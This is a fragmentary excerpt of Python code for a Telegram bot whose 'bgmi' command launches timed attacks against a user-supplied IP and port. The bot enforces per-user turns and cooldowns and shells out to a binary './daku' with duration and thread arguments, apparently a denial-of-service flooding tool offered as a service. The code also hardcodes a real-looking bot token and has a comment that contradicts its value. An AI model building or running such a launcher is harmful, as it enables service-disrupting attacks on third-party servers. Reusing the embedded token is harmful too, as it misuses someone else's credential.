...
# Bot token
BOT_TOKEN = '7047464931:AAGzCWywvMCwStng_TJB-XIIEDNn7DprXAg'  # Replace with your bot token
...
COOLDOWN_PERIOD = 900  # 60 seconds cooldown after an attack

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack_user, current_attack_end_time, cooldown_attacks, attack_time_limit
    ...
    if current_attack_user is not None:
        ...
        if remaining_time > 0:
            ...
            # Reset if the attack time has expired
  ...
  # **Set attack cooldown**
    ...
    # Run attack and set cooldown after completion
...
async def run_attack(ip, port, time_duration, update, user_id):
    ...
    try:
        command = f"./daku {ip} {port} {time_duration} {10} {default_thread}"
